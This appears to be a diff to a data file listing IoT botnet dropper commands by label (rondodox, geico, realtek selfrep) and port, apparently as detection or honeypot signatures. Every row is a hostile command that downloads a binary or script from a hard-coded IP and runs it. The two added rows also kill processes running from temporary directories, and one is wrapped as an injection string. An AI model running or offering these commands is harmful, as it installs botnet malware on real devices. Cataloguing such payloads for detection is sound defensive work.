@@ -20,6 +20,8 @@ geico-ppppl3-nc	0	echo|nc 160.119.71.134 7003 > a$$;chmod 777 a$$;./a$$
 geico-victoria-drop	0	cd /tmp;rm m68k;wget http://160.119.71.134/n2/m68k;chmod 777 m68k;./m68k victoria;rm m68k
 rondodox-naz-9999	9999	wget -qO- http://194.26.192.87/rondo.``naz.sh|sh&
 rondodox-qpu-ike	500	wget -qO- http://194.26.192.87/rondo.``qpu.sh|sh&
+rondodox-naz-9999-sep	9999	for p in /proc/[0-9]*;do pi=${p##*/};el=`ls -l "$p/exe"`||continue;case "$el" in */lib/*) continue;;esac;case "$el" in */tmp/*|*/var/*|*/dev/*|*/mnt/*)kill -9 "$pi";;esac;done;wget -qO- http://94.249.230.216/rondo.``naz|sh&
+rondodox-qpu-ike-sep	500	HAXBHAXBHAXBHAXB";for p in /proc/[0-9]*;do pi=${p##*/};el=`ls -l "$p/exe"`||continue;case "$el" in */lib/*) continue;;esac;case "$el" in */tmp/*|*/var/*|*/dev/*|*/mnt/*)kill -9 "$pi";;esac;done;(curl -s http://94.249.230.216/rondo.``qpu||wget -qO- http://94.249.230.216/rondo.``qpu)|sh&echo -n "
 realtek-selfrep-wire	9034	orf; cd /tmp; rm -rf mipsel; /bin/busybox wget http://58.211.144.243:800/mipsel; chmod +x mipsel; ./mipsel realtek.selfrep; #
 kataru-realtek	9034	orf; cd /tmp; /bin/busybox wget http://188.165.84.165:8081/188.165.84.165; chmod 777 188.165.84.165; ./188.165.84.165 selfrep.realtek
 cling-dropper	0	wget http://118.145.196.225:800/mipsel; chmod 777 mipsel; ./mipsel $group;
